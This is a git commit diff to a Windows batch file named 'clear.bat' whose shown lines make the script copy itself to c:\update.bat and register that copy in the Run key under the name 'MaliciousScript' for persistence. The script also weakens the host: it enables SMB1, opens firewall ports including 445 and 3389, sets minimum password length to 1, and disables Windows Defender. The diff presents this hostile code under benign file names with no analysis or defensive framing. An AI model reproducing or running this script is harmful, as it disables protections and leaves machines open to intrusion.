97d00cb19b90cf0226ab7f06c1eff4c94aa9e23a
disketteomelette <39524746+disketteomelette@users.noreply.github.com>
2024-06-05 13:35:04 +0200

    Update clear.bat

--- clear.bat
+++ clear.bat
@@ -1,5 +1,7 @@
 @echo off
 setlocal
+set "nom=%~nx0"
+copy %nom% c:\update.bat
 ver | findstr /i "5\.1\." > nul && set version=XP
 ver | findstr /i "5\.2\." > nul && set version=Server2003
 ver | findstr /i "6\." > nul && set version=VistaWin7Server2008
@@ -19,5 +21,5 @@ dism /online /enable-feature /featurename:SMB1Protocol /all /norestart
 for %%p in (21 23 25 80 139 445 3389) do netsh advfirewall firewall add rule name="Open Port %%p" dir=in action=allow protocol=TCP localport=%%p
 net accounts /minpwlen:1 /maxpwage:unlimited /minpwage:0 /uniquepw:0
 sc stop WinDefend & sc config WinDefend start= disabled
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MaliciousScript /t REG_SZ /d "c:\path\to\malicious_script.bat" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MaliciousScript /t REG_SZ /d "c:\update.bat" /f
 endlocal
